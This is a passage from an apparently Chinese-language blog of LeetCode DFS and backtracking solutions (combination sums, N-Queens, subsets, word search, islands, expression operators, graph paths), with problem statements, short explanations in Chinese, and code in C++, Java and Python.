0, &quot;&quot;, ans) return ans def dfs(self, n, left, cur, ans): if not n and not left: ans.append(cur) return if n &gt; 0: self.dfs(n - 1, left + 1, cur + &#x27;(&#x27;, ans) if left &gt; 0: self.dfs(n, left - 1, cur + &#x27;)&#x27;, ans) 39. Combination Sum Given a set of candidate numbers (C) and a target number (T), find all unique combinations in C where the candidate numbers sums to T. The same repeated number may be chosen from C unlimited number of times. Note: All numbers (including target) will be positive integers. Elements in a combination (_a_1, _a_2, … , _a_k) must be in non-descending order. (ie, _a_1 ≤ _a_2 ≤ … ≤ _a_k). The solution set must not contain duplicate combinations. For example, given candidate set 2,3,6,7 and target 7, A solution set is: [7] [2, 2, 3] 题目地址：leetcode Combination Sum 题意：给定一串序列和一个target.要求求出序列中的所有子集，使得子集和为target（元素可以重复使用） 思路： 排序然后DFS进行枚举。 结果什么时候会重复？当candidates有重复元素的时候。（虽然这题感觉没有重复的数据。。） 但是比如[2,2,3,6,7] 结果应该还是[7]、[2,2,3] C++ 1234567891011121314151617181920212223242526class Solution &#123;private: void dfs(int cur,int curSum,vector&lt;int&gt; &amp;path, vector&lt;vector&lt;int&gt;&gt; &amp;ans,const vector&lt;int&gt; &amp;candidates, const int target) &#123; if (curSum == target) &#123; ans.push_back(path); return; &#125; for (int i = cur; i &lt; candidates.size(); i++) &#123; if (curSum + candidates[i] &lt;= target) &#123; path.push_back(candidates[i]); dfs(i, curSum + candidates[i], path, ans, candidates, target); path.pop_back(); &#125; while (i + 1 &lt; candidates.size() &amp;&amp; candidates[i] == candidates[i + 1]) i++; &#125; &#125;public: vector&lt;vector&lt;int&gt;&gt; combinationSum(vector&lt;int&gt;&amp; candidates, int target) &#123; vector&lt;vector&lt;int&gt;&gt; ans; vector&lt;int&gt; path; sort(candidates.begin(), candidates.end()); dfs(0, 0, path, ans, candidates, target); return ans; &#125;&#125;; Java 1234567891011121314151617181920212223242526class Solution &#123; public List&lt;List&lt;Integer&gt;&gt; combinationSum(int[] candidates, int target) &#123; Arrays.sort(candidates); List&lt;List&lt;Integer&gt;&gt; ans = new ArrayList&lt;&gt;(); List&lt;Integer&gt; path = new ArrayList&lt;&gt;(); dfs(0,target,path,ans,candidates); return ans; &#125; private void dfs(int cur, int target, List&lt;Integer&gt; path, List&lt;List&lt;Integer&gt;&gt; ans, final int[] candidates) &#123; if (target == 0) &#123; ans.add(new ArrayList&lt;&gt;(path)); return; &#125; for (int i = cur; i &lt; candidates.length; i++) &#123; if (candidates[i] &lt;= target) &#123; path.add(candidates[i]); dfs(i, target - candidates[i], path, ans, candidates); path.remove(path.size() - 1); &#125; while(i + 1 &lt; candidates.length &amp;&amp; candidates[i] == candidates[i+1]) i++; &#125; &#125;&#125; Python 1234567891011121314151617181920212223242526class Solution(object): def combinationSum(self, candidates, target): &quot;&quot;&quot; :type candidates: List[int] :type target: int :rtype: List[List[int]] &quot;&quot;&quot; candidates.sort() ans, _path = [], [] self.solve(0, target, _path, ans, candidates) return ans def solve(self, cur, target, _path, ans, candidates): if target == 0: ans.append(_path[:]) # use _path will be wrong. return while cur &lt; len(candidates): if candidates[cur] &lt;= target: _path.append(candidates[cur]) self.solve(cur, target - candidates[cur], _path, ans, candidates) _path.pop() while cur + 1 &lt; len(candidates) and candidates[cur] == candidates[cur + 1]: cur += 1 cur += 1 40. Combination Sum II Given a collection of candidate numbers (C) and a target number (T), find all unique combinations in C where the candidate numbers sums to T. Each number in C may only be used once in the combination. Note: All numbers (including target) will be positive integers. Elements in a combination (_a_1, _a_2, … , _a_k) must be in non-descending order. (ie, _a_1 ≤ _a_2 ≤ … ≤ _a_k). The solution set must not contain duplicate combinations. For example, given candidate set 10,1,2,7,6,1,5 and target 8, A solution set is: [1, 7] [1, 2, 5] [2, 6] [1, 1, 6] 题目地址：leetcode Combination Sum II 题意：和上面一题差不多，都是求子集和为target的所有子集。 不同的地方在于，这一题的元素只能使用一次。 思路: 也是排序后进行DFS，不过不同的地方在于下一次枚举的元素应该为当前元素位置+1，还有就是如果当前元素有解，那么下一次从下一个不同于这个元素的位置开始。 C++ 123456789101112131415161718192021222324252627class Solution &#123;private: void dfs(int cur,int target,vector&lt;int&gt; &amp;path, vector&lt;vector&lt;int&gt;&gt; &amp;ans,const vector&lt;int&gt; &amp;candidates) &#123; if (target == 0) &#123; ans.push_back(path); return; &#125; for (int i = cur; i &lt; candidates.size(); i++) &#123; if(i &gt; cur &amp;&amp; candidates[i] == candidates[i - 1]) continue; if (candidates[i] &lt;= target) &#123; path.push_back(candidates[i]); dfs(i + 1, target - candidates[i], path, ans, candidates); path.pop_back(); &#125; &#125; &#125; public: vector&lt;vector&lt;int&gt;&gt; combinationSum2(vector&lt;int&gt;&amp; candidates, int target) &#123; vector&lt;vector&lt;int&gt;&gt; ans; vector&lt;int&gt; path; sort(candidates.begin(), candidates.end()); dfs(0, target, path, ans, candidates); return ans; &#125;&#125;; Java 123456789101112131415161718192021222324class Solution &#123; public List&lt;List&lt;Integer&gt;&gt; combinationSum2(int[] candidates, int target) &#123; Arrays.sort(candidates); List&lt;List&lt;Integer&gt;&gt; ans = new ArrayList&lt;&gt;(); List&lt;Integer&gt; path = new ArrayList&lt;&gt;(); dfs(0,target,path,ans,candidates); return ans; &#125; private void dfs(int cur, int target, List&lt;Integer&gt; path, List&lt;List&lt;Integer&gt;&gt; ans, final int[] candidates) &#123; if (target == 0) &#123; ans.add(new ArrayList&lt;&gt;(path)); return; &#125; for (int i = cur; i &lt; candidates.length; i++) &#123; if (candidates[i] &lt;= target) &#123; path.add(candidates[i]); dfs(i + 1, target - candidates[i], path, ans, candidates); path.remove(path.size() - 1); &#125; while(i + 1 &lt; candidates.length &amp;&amp; candidates[i] == candidates[i+1]) i++; &#125; &#125;&#125; Python 12345678910111213141516171819202122232425class Solution(object): def combinationSum2(self, candidates, target): &quot;&quot;&quot; :type candidates: List[int] :type target: int :rtype: List[List[int]] &quot;&quot;&quot; candidates.sort() ans, _path = [], [] self.solve(0, target, _path, ans, candidates) return ans def solve(self, cur, target, _path, ans, candidates): if target == 0: ans.append(_path[:]) # use _path will be wrong. return while cur &lt; len(candidates): if candidates[cur] &lt;= target: _path.append(candidates[cur]) self.solve(cur + 1, target - candidates[cur], _path, ans, candidates) _path.pop() while cur + 1 &lt; len(candidates) and candidates[cur] == candidates[cur + 1]: cur += 1 cur += 1 51. N-Queens The n-queens puzzle is the problem of placing n queens on an n×n chessboard such that no two queens attack each other. Given an integer n, return all distinct solutions to the n-queens puzzle. Each solution contains a distinct board configuration of the n-queens' placement, where 'Q' and '.' both indicate a queen and an empty space respectively. For example, There exist two distinct solutions to the 4-queens puzzle: 1234567891011[ [&quot;.Q..&quot;, &#x2F;&#x2F; Solution 1 &quot;...Q&quot;, &quot;Q...&quot;, &quot;..Q.&quot;], [&quot;..Q.&quot;, &#x2F;&#x2F; Solution 2 &quot;Q...&quot;, &quot;...Q&quot;, &quot;.Q..&quot;]] 题目地址：leetcode N-Queens 题目大意: 给定N，求出N皇后的解 思路: DFS搜索解即可。先尝试防止第row行，然后枚举第row行的所有col看是否不冲突 代码和52题几乎一样。只是改成具体结果而已。（建议先做52题） C++ 123456789101112131415161718192021222324252627282930313233343536class Solution &#123;public: inline bool check(vector&lt;int&gt; &amp;place, int cur)&#123; for (int j = 0; j &lt; cur; j++) if (place[cur] == place[j] || abs(place[cur] - place[j]) == cur - j) return false; return true; &#125; void solve(int cur, int n, vector&lt;int&gt; &amp;place, vector&lt;vector&lt;string&gt;&gt; &amp;ans)&#123; if (cur == n)&#123; vector&lt;string&gt; res; for (int k = 0; k &lt; n;k++) for (int i = 0; i &lt; n;i++) if (place[i] == k)&#123; string temp(n, &#x27;.&#x27;); temp[i] = &#x27;Q&#x27;; res.push_back(temp); &#125; ans.push_back(res); return; &#125; for (int i = 0; i &lt; n; i++) &#123; place[cur] = i; if (check(place, cur)) solve(cur + 1, n, place, ans); &#125; &#125; vector&lt;vector&lt;string&gt;&gt; solveNQueens(int n) &#123; vector&lt;vector&lt;string&gt;&gt;ans; vector&lt;int&gt; place(n, 0); solve(0, n, place, ans); return ans; &#125;&#125;; python 12345678910111213141516171819202122232425262728class Solution: # @return a list of lists of string def solveNQueens(self, n): self.ans=[] place=[0]*n self.solve(0, n,place) return self.ans def check(self,cur,place): for i in range(0,cur): if place[i]==place[cur] or abs(place[i]-place[cur])==cur-i: return False return True def solve(self,cur,n,place): if cur==n: temp=[] for k in range(0,n): for i in range(0,n): if place[i]==k: L=&#x27;.&#x27;*i+&#x27;Q&#x27;+&#x27;.&#x27;*(n-i-1) temp.append(L) self.ans.append(temp) return for i in range(0,n): place[cur]=i if(self.check(cur,place)): self.solve(cur + 1, n, place) 另一种写法： 12345678910111213141516171819202122232425262728293031323334353637383940class Solution &#123; bool check(int x, int y, vector&lt;string&gt; &amp;board) &#123; for (int i = 0; i &lt; x; ++i) if (board[i][y] == &#x27;Q&#x27;) return false; for (int i = x - 1, j = y - 1; 0 &lt;= i &amp;&amp; 0 &lt;= j; --i, --j) if (board[i][j] == &#x27;Q&#x27;) return false; for (int i = x - 1, j = y + 1; j &lt; board.size() &amp;&amp; i &gt;= 0; --i, ++j) if (board[i][j] == &#x27;Q&#x27;) return false; return true; &#125; void dfs(int x, const int n, vector&lt;string&gt; &amp;board, vector&lt;vector&lt;string&gt;&gt; &amp;ans) &#123; if (x &gt;= n) &#123; ans.push_back(board); return; &#125; for(int y = 0; y &lt; n; ++y)&#123; if (check(x, y, board)) &#123; board[x][y] = &#x27;Q&#x27;; dfs(x + 1, n, board, ans); board[x][y] = &#x27;.&#x27;; &#125; &#125; &#125;public: vector&lt;vector&lt;string&gt;&gt; solveNQueens(int n) &#123; vector&lt;string&gt; board(n, string(n, &#x27;.&#x27;)); vector&lt;vector&lt;string&gt;&gt; ans; dfs(0, n, board, ans); return ans; &#125;&#125;; 52. N-Queens II Follow up for N-Queens problem. Now, instead outputting board configurations, return the total number of distinct solutions. 题目地址：leetcode N-Queens II 题目大意：给定数字n，求n皇后的解有多少个 思路: 大一就做过的玩意~ 水。。 C++ 12345678910111213141516171819202122232425262728class Solution &#123; inline bool check(int row, vector&lt;int&gt; &amp;place)&#123; for(int i = 0; i &lt; row; ++i) if(place[i] == place[row] row - i == abs(place[row] - place[i])) return false; return true; &#125; void dfs(int row, vector&lt;int&gt; &amp;place, int &amp;ans)&#123; if(row == place.size())&#123; ++ans; return; &#125; for(int i = 0; i &lt; place.size(); ++i)&#123; place[row] = i; if(check(row, place)) dfs(row + 1, place, ans); &#125; &#125; public: int totalNQueens(int n) &#123; vector&lt;int&gt; place(n, 0); int ans = 0; dfs(0, place, ans); return ans; &#125;&#125;; Python 12345678910111213141516171819202122class Solution: # @return an integer def totalNQueens(self, n): self._cnt=0 place=[0]*n self.solve(0, n,place) return self._cnt def check(self,cur,place): for i in range(0,cur): if place[i]==place[cur] or abs(place[i]-place[cur])==cur-i: return False return True def solve(self,cur,n,place): if cur==n: self._cnt += 1 return for i in range(0,n): place[cur]=i if(self.check(cur,place)): self.solve(cur + 1, n, place) 另一种写法： 12345678910111213141516171819202122232425262728293031323334353637383940class Solution &#123; bool check(int x, int y, vector&lt;string&gt; &amp;board) &#123; for (int i = 0; i &lt; x; ++i) if (board[i][y] == &#x27;Q&#x27;) return false; for (int i = x - 1, j = y - 1; 0 &lt;= i &amp;&amp; 0 &lt;= j; --i, --j) if (board[i][j] == &#x27;Q&#x27;) return false; for (int i = x - 1, j = y + 1; j &lt; board.size() &amp;&amp; i &gt;= 0; --i, ++j) if (board[i][j] == &#x27;Q&#x27;) return false; return true; &#125; void dfs(int x, const int n, vector&lt;string&gt; &amp;board, int &amp;ans) &#123; if (x &gt;= n) &#123; ++ans; return; &#125; for(int y = 0; y &lt; n; ++y)&#123; if (check(x, y, board)) &#123; board[x][y] = &#x27;Q&#x27;; dfs(x + 1, n, board, ans); board[x][y] = &#x27;.&#x27;; &#125; &#125; &#125;public: int totalNQueens(int n) &#123; vector&lt;string&gt; board(n, string(n, &#x27;.&#x27;)); int ans = 0; dfs(0, n, board, ans); return ans; &#125;&#125;; 77. Combinations Given two integers n and k, return all possible combinations of k numbers out of 1 ... n. For example, If n = 4 and k = 2, a solution is: [ [2,4], [3,4], [2,3], [1,2], [1,3], [1,4], ] 题目地址：leetcode Combinations 题意：给定1~n中由k个数组成的组合。 思路：dfs C++ 1234567891011121314151617181920class Solution &#123;public: void solve( int cnt, int cur, int n, int k, vector&lt;int&gt;&amp; vis, vector&lt;vector&lt;int&gt; &gt; &amp; ans)&#123; if (cnt == k)&#123; ans.push_back(vis); return; &#125; for (int i = cur; i &lt; n; i++)&#123; vis.push_back(i+1); solve(cnt+1,i+1, n, k,vis, ans); vis.pop_back(); &#125; &#125; vector&lt;vector&lt;int&gt; &gt; combine(int n, int k) &#123; vector&lt;vector&lt;int&gt; &gt; ans; vector&lt;int&gt; vis; solve(0,0, n, k,vis, ans); return ans; &#125;&#125;; Java 12345678910111213141516171819202122class Solution &#123; private void dfs(int cur, List&lt;Integer&gt; res, final int n, final int k, List&lt;List&lt;Integer&gt;&gt; ans) &#123; if (res.size() == k) &#123; ans.add(new ArrayList&lt;&gt;(res)); return; &#125; for (int i = cur; i &lt;= n; i++) &#123; res.add(i); dfs(i + 1, res, n, k, ans); res.remove(res.size() - 1); &#125; &#125; public List&lt;List&lt;Integer&gt;&gt; combine(int n, int k) &#123; List&lt;Integer&gt; res = new ArrayList&lt;&gt;(); List&lt;List&lt;Integer&gt;&gt; ans = new ArrayList&lt;&gt;(); dfs(1, res, n, k, ans); return ans; &#125;&#125; Python 现在的貌似TLE了，原来AC的 12345678910111213141516class Solution: # @return a list of lists of integers def combine(self, n, k): ans,res=[],[] self.solve(res, 0, 0, n, k, ans) return ans def solve(self,res,cnt,cur,n,k,ans): if cnt==k: ans.append(res[:]) return for i in range(cur,n): res.append(i+1) self.solve(res, cnt+1, i+1, n, k, ans) res.pop() 78. Subsets Given a set of distinct integers, S, return all possible subsets. Note: Elements in a subset must be in non-descending order. The solution set must not contain duplicate subsets. For example, If S = [1,2,3], a solution is: [ [3], [1], [2], [1,2,3], [1,3], [2,3], [1,2], [] ] 题目地址：leetcode Subsets 题意:给定集合S（元素唯一）,求S的所有子集（包括空集） 思路：和上面的组合不同在于，组合那题当cnt==k时候为解，这一题每一次递归都是一次解。 C++ 123456789101112131415161718class Solution &#123;public: void solve(int cur, int n, vector&lt;int&gt; &amp;nums, vector&lt;int&gt; &amp;res,vector&lt;vector&lt;int&gt;&gt; &amp; ans)&#123; ans.push_back(res); for (int i = cur; i &lt; n; i++)&#123; res.push_back(nums[i]); solve(i+1, n, nums, res, ans); res.pop_back(); &#125; &#125; vector&lt;vector&lt;int&gt;&gt; subsets(vector&lt;int&gt; &amp;nums) &#123; vector&lt;vector&lt;int&gt;&gt; ans; vector&lt;int&gt; res; solve(0, nums.size(), nums, res, ans); return ans; &#125;&#125;; Java 12345678910111213141516171819class Solution &#123; private void dfs(int cur, List&lt;Integer&gt; res, int[] nums, List&lt;List&lt;Integer&gt;&gt; ans) &#123; ans.add(new ArrayList&lt;&gt;(res)); for (int i = cur; i &lt; nums.length; i++) &#123; res.add(nums[i]); dfs(i + 1, res, nums, ans); res.remove(res.size() - 1); &#125; &#125; public List&lt;List&lt;Integer&gt;&gt; subsets(int[] nums) &#123; List&lt;Integer&gt; res = new ArrayList&lt;&gt;(); List&lt;List&lt;Integer&gt;&gt; ans = new ArrayList&lt;&gt;(); dfs(0, res, nums, ans); return ans; &#125;&#125; Python 12345678910111213141516class Solution(object): def subsets(self, nums): &quot;&quot;&quot; :type nums: List[int] :rtype: List[List[int]] &quot;&quot;&quot; ans,res=[],[] self.solve(0, len(nums), nums, res, ans) return ans def solve(self,cur,n,nums,res,ans): ans.append(res[:]) for i in range(cur,n): res.append(nums[i]) self.solve(i+1, len(nums), nums, res, ans) res.pop() 79. Word Search Given a 2D board and a word, find if the word exists in the grid. The word can be constructed from letters of sequentially adjacent cell, where \"adjacent\" cells are those horizontally or vertically neighboring. The same letter cell may not be used more than once. For example, Given board = 12345[ [&quot;ABCE&quot;], [&quot;SFCS&quot;], [&quot;ADEE&quot;]] word = \"ABCCED\", -&gt; returns true, word = \"SEE\", -&gt; returns true, word = \"ABCB\", -&gt; returns false. 题目地址：leetcode Word Search 题目大意：给定一个矩阵和一个字符串，求该字符串是否能在矩阵中找到。（通过上下、左右相邻拼接，但是每个字符只能使用一次） 思路：DFS，注意剪枝。 PS:进阶篇：Word Search II C++ 123456789101112131415161718192021222324252627282930313233343536const int dx[4] = &#123;1, -1, 0, 0 &#125;;const int dy[4] = &#123;0, 0, 1, -1 &#125;;class Solution &#123; public: bool ok(int nx,int ny,int m,int n)&#123; if (nx &lt; 0 || nx &gt;= m || ny &lt; 0 || ny &gt;= n) return false; return true; &#125; bool dfs(int x, int y, int cur, vector&lt;vector&lt;bool&gt; &gt;&amp; vis,vector&lt;vector&lt;char&gt; &gt; &amp;board, string &amp;word)&#123; if (cur == word.length() ) return true; if (cur &gt; word.length()) return false; for (int k = 0; k &lt; 4; k++)&#123; int nx = x + dx[k], ny = y + dy[k]; if (ok(nx,ny,board.size(),board[0].size()) &amp;&amp;!vis[nx][ny]&amp;&amp;board[nx][ny]==word[cur])&#123; vis[nx][ny] = true; if (dfs(nx, ny, cur+1, vis, board, word)) return true; vis[nx][ny] = false; &#125; &#125; return false; &#125; bool exist(vector&lt;vector&lt;char&gt; &gt; &amp;board, string word) &#123; vector&lt;vector&lt;bool&gt; &gt; vis(board.size(), vector&lt;bool&gt;(board[0].size(), 0)); for (int i = 0; i &lt; board.size(); i++)&#123; for (int j = 0; j &lt; board[0].size(); j++)&#123; if (board[i][j] != word[0]) continue; vis[i][j] = true; if (dfs(i, j, 1, vis, board, word)) return true; vis[i][j] = false; &#125; &#125; return false; &#125; &#125;; Python 123456789101112131415161718192021222324252627282930class Solution: # @param board, a list of lists of 1 length string # @param word, a string # @return a boolean def exist(self, board, word): vis = [[0 for i in range(len(board[0]))]for j in range(len(board))] m , n = len(board) , len(board[0]) self.dx , self.dy= [1,-1,0,0], [0,0,1,-1] for i in range(m): for j in range(n): if board[i][j]==word[0]: vis[i][j]=True if(self.dfs(i,j,1,vis,board,word)): return True vis[i][j]=False return False def dfs(self,x,y,cur,vis,board,word): if cur==len(word): return True if cur &gt; len(word): return False for k in range(4): nx,ny=x+self.dx[k] , y + self.dy[k] if nx &lt; 0 or nx &gt;= len(board) or ny &lt;0 or ny &gt;= len(board[0]): continue if board[nx][ny]==word[cur] and not vis[nx][ny]: vis[nx][ny]=True if(self.dfs(nx, ny, cur+1, vis, board, word)): return True vis[nx][ny]=False return False 另一种写法： C++ 1234567891011121314151617181920212223242526272829303132class Solution &#123; const vector&lt;int&gt; dx = &#123; 0, 0, 1, -1 &#125;; const vector&lt;int&gt; dy = &#123; 1, -1, 0, 0 &#125;; bool dfs(int cur, int x, int y, vector&lt;vector&lt;bool&gt;&gt; &amp;vis, const vector&lt;vector&lt;char&gt;&gt;&amp; board, const string &amp;word) &#123; if (cur == word.size()) return true; if (x &lt; 0 || y &lt; 0 || x &gt;= board.size() || y &gt;= board[0].size() || vis[x][y] || word[cur] != board[x][y]) return false; vis[x][y] = true; for (int i = 0; i &lt; 4; ++i) if (dfs(cur + 1, x + dx[i], y + dy[i], vis, board, word)) return true; vis[x][y] = false; return false; &#125;public: bool exist(vector&lt;vector&lt;char&gt;&gt;&amp; board, string word) &#123; if (board.empty() || board[0].empty()) return false; vector&lt;vector&lt;bool&gt;&gt; vis(board.size(), vector&lt;bool&gt;(board[0].size(), false)); for (int i = 0; i &lt; board.size(); ++i) for (int j = 0; j &lt; board[i].size(); ++j) if (word[0] == board[i][j] &amp;&amp; dfs(0, i, j, vis, board, word)) return true; return false; &#125;&#125;; Python 123456789101112131415161718192021222324252627282930313233class Solution(object): def dfs(self, cur, x, y, vis, board, word): if cur == len(word): return True if x &lt; 0 or y &lt; 0 or x &gt;= len(board) or y &gt;= len(board[0]): return False if vis[x][y] or word[cur] != board[x][y]: return False vis[x][y] = True for dx, dy in ((1, 0), (-1, 0), (0, 1), (0, -1)): if self.dfs(cur + 1, x + dx, y + dy, vis, board, word): return True vis[x][y] = False return False def exist(self, board, word): &quot;&quot;&quot; :type board: List[List[str]] :type word: str :rtype: bool &quot;&quot;&quot; if not board or not board[0]: return False vis = [[False] * len(board[0]) for _ in range(len(board))] for i in range(len(board)): for j in range(len(board[i])): if board[i][j] == word[0] and self.dfs(0, i, j, vis, board, word): return True return False 90. Subsets II Given a collection of integers that might contain duplicates, S, return all possible subsets. Note: Elements in a subset must be in non-descending order. The solution set must not contain duplicate subsets. For example, If S = [1,2,2], a solution is: [ [2], [1], [1,2,2], [2,2], [1,2], []] 题目地址：leetcode Subsets II 题意:给定集合S（元素不唯一）,求S的所有子集（包括空集） 思路：和上面的subset一样，只不过需要去重。 C++ 1234567891011121314151617181920class Solution &#123;public: void solve(int cur, int n, vector&lt;int&gt; &amp;nums, vector&lt;int&gt; &amp;res,vector&lt;vector&lt;int&gt;&gt; &amp; ans)&#123; ans.push_back(res); for (int i = cur; i &lt; n; i++)&#123; res.push_back(nums[i]); solve(i+1, n, nums, res, ans); res.pop_back(); while (i + 1 &lt; n &amp;&amp; nums[i] == nums[i + 1]) i++; &#125; &#125; vector&lt;vector&lt;int&gt;&gt; subsetsWithDup(vector&lt;int&gt; &amp;nums) &#123; sort(nums.begin(), nums.end()); vector&lt;vector&lt;int&gt;&gt; ans; vector&lt;int&gt; res; solve(0, nums.size(), nums, res, ans); return ans; &#125;&#125;; Java 123456789101112131415161718192021class Solution &#123; private void dfs(int cur, List&lt;Integer&gt; res, int[] nums, List&lt;List&lt;Integer&gt;&gt; ans) &#123; ans.add(new ArrayList&lt;&gt;(res)); for (int i = cur; i &lt; nums.length; i++) &#123; res.add(nums[i]); dfs(i + 1, res, nums, ans); res.remove(res.size() - 1); while (i + 1 &lt; nums.length &amp;&amp; nums[i] == nums[i + 1]) i++; &#125; &#125; public List&lt;List&lt;Integer&gt;&gt; subsetsWithDup(int[] nums) &#123; Arrays.sort(nums); List&lt;Integer&gt; res = new ArrayList&lt;&gt;(); List&lt;List&lt;Integer&gt;&gt; ans = new ArrayList&lt;&gt;(); dfs(0, res, nums, ans); return ans; &#125;&#125; Python 12345678910111213141516171819202122class Solution(object): def subsetsWithDup(self, nums): &quot;&quot;&quot; :type nums: List[int] :rtype: List[List[int]] &quot;&quot;&quot; nums.sort() ans, res = [], [] self.solve(0, len(nums), nums, res, ans) return ans def solve(self, cur, n, nums, res, ans): ans.append(res[:]) i = cur while i &lt; n: res.append(nums[i]) self.solve(i + 1, len(nums), nums, res, ans) while i + 1 &lt; n and nums[i] == nums[i + 1]: i += 1 res.pop() i += 1 200. Number of Islands Given a 2d grid map of '1's (land) and '0's (water), count the number of islands. An island is surrounded by water and is formed by connecting adjacent lands horizontally or vertically. You may assume all four edges of the grid are all surrounded by water. Example 1: 123411110110101100000000 Answer: 1 Example 2: 123411000110000010000011 Answer: 3 传送门 题意: 给定由0和1组成的二维数组，求1的连通块 思路：dfs/bfs均可。 123456789101112131415161718192021222324class Solution: # @param grid, a list of list of characters # @return an integer def numIslands(self, grid): if not grid or not grid[0]:return 0 m,n=len(grid),len(grid[0]) vis = [[False for j in xrange(n)]for i in xrange(m)] self.dx,self.dy=[1,-1,0,0],[0,0,1,-1] ans = 0 for i in xrange(m): for j in xrange(n): if grid[i][j]==&#x27;1&#x27; and not vis[i][j]: vis[i][j]=True self.dfs(i,j,grid,vis) ans+=1 return ans def dfs(self,x,y,grid,vis): for k in xrange(4): nx,ny=x+self.dx[k],y+self.dy[k] if nx&lt;0 or ny&lt;0 or nx &gt;=len(grid) or ny&gt;=len(grid[0])\\ or grid[nx][ny]==&#x27;0&#x27; or vis[nx][ny]: continue vis[nx][ny]=True self.dfs(nx,ny,grid,vis) 216. Combination Sum III Find all possible combinations of k numbers that add up to a number n, given that only numbers from 1 to 9 can be used and each combination should be a unique set of numbers. Ensure that numbers within the set are sorted in ascending order. Example 1:_Input: k_ = 3, n = 7 Output: [[1,2,4]] Example 2: Input: k = 3, n = 9 Output: [[1,2,6], [1,3,5], [2,3,4]] 传送门 题意：给定n，要求用1到9的k个数来使得这k个数的和为n 思路：DFS。。。 C++ 1234567891011121314151617181920212223242526class Solution &#123;public: vector&lt;vector&lt;int&gt; &gt;ans; vector&lt;vector&lt;int&gt; &gt; combinationSum3(int k, int n) &#123; vector&lt;int&gt; res; dfs(0,res,k,n); return ans; &#125; void dfs(int cur,vector&lt;int&gt; &amp;res,const int k,const int n)&#123; if(res.size() &gt;k) return; if(res.size() ==k)&#123; int sum = 0; for(int i=0;i&lt;k;i++) sum += res[i]; if(sum == n) ans.push_back(res); return; &#125; for(int i = cur+1;i&lt;=9;i++)&#123; res.push_back(i); dfs(i,res,k,n); res.pop_back(); &#125; &#125;&#125;; 241. Different Ways to Add Parentheses Given a string of numbers and operators, return all possible results from computing all the different possible ways to group numbers and operators. The valid operators are +, - and *. Example 1 Input: \"2-1-1\". 12((2-1)-1) &#x3D; 0(2-(1-1)) &#x3D; 2 Output: [0, 2] Example 2 Input: \"2*3-4*5\" 12345(2*(3-(4*5))) &#x3D; -34((2*3)-(4*5)) &#x3D; -14((2*(3-4))*5) &#x3D; -10(2*((3-4)*5)) &#x3D; -10(((2*3)-4)*5) &#x3D; 10 Output: [-34, -14, -10, -10, 10] 题目地址：leetcode Different Ways to Add Parentheses 题意：给定一个字符串表达式，要求你添加若干个括号，得到所有可能的结果。 思路：分治法，若s[i] 为+-*三个符号，把它分为左右两部分即可。此外，可以用记忆化搜索加快速度。 1234567891011121314151617181920212223242526class Solution(object): def diffWaysToCompute(self, s): &quot;&quot;&quot; :type s: str :rtype: List[int] &quot;&quot;&quot; dp = &#123;&#125; return self.dfs(s, dp) def dfs(self, s, dp): if s in dp: return dp[s] ans = [] n = len(s) for i in xrange(n): if s[i] not in [&quot;+&quot;, &quot;-&quot;, &quot;*&quot;]: continue res1, res2 = self.dfs(s[:i], dp), self.dfs(s[i + 1:], dp) for x in res1: for y in res2: if s[i] == &#x27;+&#x27;: ans.append(x + y) elif s[i] == &#x27;-&#x27;: ans.append(x - y) elif s[i] == &#x27;*&#x27;: ans.append(x * y) if not ans: ans.append(int(s)) dp[s] = ans return ans 282. Expression Add Operators Given a string that contains only digits 0-9 and a target value, return all possibilities to add binary operators (not unary) +, -, or * between the digits so they evaluate to the target value. Examples: 12345&quot;123&quot;, 6 -&gt; [&quot;1+2+3&quot;, &quot;1*2*3&quot;] &quot;232&quot;, 8 -&gt; [&quot;2*3+2&quot;, &quot;2+3*2&quot;]&quot;105&quot;, 5 -&gt; [&quot;1*0+5&quot;,&quot;10-5&quot;]&quot;00&quot;, 0 -&gt; [&quot;0+0&quot;, &quot;0-0&quot;, &quot;0*0&quot;]&quot;3456237490&quot;, 9191 -&gt; [] 题目地址：leetcode Expression Add Operators 题意：给定0~9数字组成的字符串和一个数target，要求你输出能用+ - * 三种运算符计算得到target的所有解。 思路：。。还以为有啥高深的解法。想了半天。。。。就是直接DFS就可以了。。。O(4^n) ,n为字符串长度 注意点有： 由于运算符的优先级，因此，分为两半，一个是pre为计算的值，一个为val为pre右方还未计算的值，对于当前的数x，进行如下的操作可以保证优先级 加法：pre = pre + val val = x 减法： pre = pre - val val = -x 乘法：pre = pre val = val *x 当前的第一个数为'0'的情况 计算完后Break 1234567891011121314151617181920212223242526272829typedef long long int LL;class Solution &#123;public: vector&lt;string&gt; addOperators(string num, int target) &#123; vector&lt;string&gt; ans; dfs(0, &quot;&quot;, 0, 0, ans, num.length(), num, target); return ans; &#125; void dfs(int cur, string path, LL pre, LL val, vector&lt;string&gt; &amp; ans, const int n, const string &amp;num, const int target) &#123; if (cur == n &amp;&amp; pre + val == target) &#123; ans.push_back(path); return; &#125; LL x = 0; for (int i = cur; i &lt; n; i++) &#123; x = x * 10 + (num[i] - 48); // - &#x27;0&#x27; it is 48 string str_x = to_string(x); if (cur != 0) &#123; dfs(i + 1, path + &quot;+&quot; + str_x, pre + val, x, ans, n, num, target); dfs(i + 1, path + &quot;-&quot; + str_x, pre + val, -x, ans, n, num, target); dfs(i + 1, path + &quot;*&quot; + str_x, pre, val * x, ans, n, num, target); &#125; else dfs(i + 1, str_x, 0, x, ans, n, num, target); if (num[cur] == &#x27;0&#x27;) break; &#125; &#125;&#125;; 797. All Paths From Source to Target Given a directed, acyclic graph of N nodes. Find all possible paths from node 0 to node N-1, and return them in any order. The graph is given as follows: the nodes are 0, 1, ..., graph.length - 1. graph[i] is a list of all nodes j for which the edge (i, j) exists. Example: Input: [[1,2], [3], [3], []] Output: [[0,1,3],[0,2,3]] Explanation: The graph looks like this: 0---&gt;1 v v 2---&gt;3 There are two paths: 0 -&gt; 1 -&gt; 3 and 0 -&gt; 2 -&gt; 3. Note: The number of nodes in the graph will be in the range [2, 15]. You can print different paths in any order, but you should keep the order of nodes inside one path. 题目地址：leetcode All Paths From Source to Target 题目大意：给定一个y哦那个邻接表表示的有向无环图，要你输出从0节点到n-1节点的所有路径 思路：直接dfs大水题啊。(PS: 有向无环图其实都不用判断是不是重复走过了。。vis不需要也行) Python 12345678910111213141516171819202122class Solution(object): def dfs(self, cur, cur_path, vis, g, ans): if cur == len(g) - 1: ans.append(cur_path) return for nx in g[cur]: if vis[nx]: continue vis[nx] = True self.dfs(nx, cur_path + [nx], vis, g, ans) vis[nx] = False def allPathsSourceTarget(self, graph): &quot;&quot;&quot; :type graph: List[List[int]] :rtype: List[List[int]] &quot;&quot;&quot; vis = [False] * len(graph) ans = [] cur_path = [0] self.dfs(0, 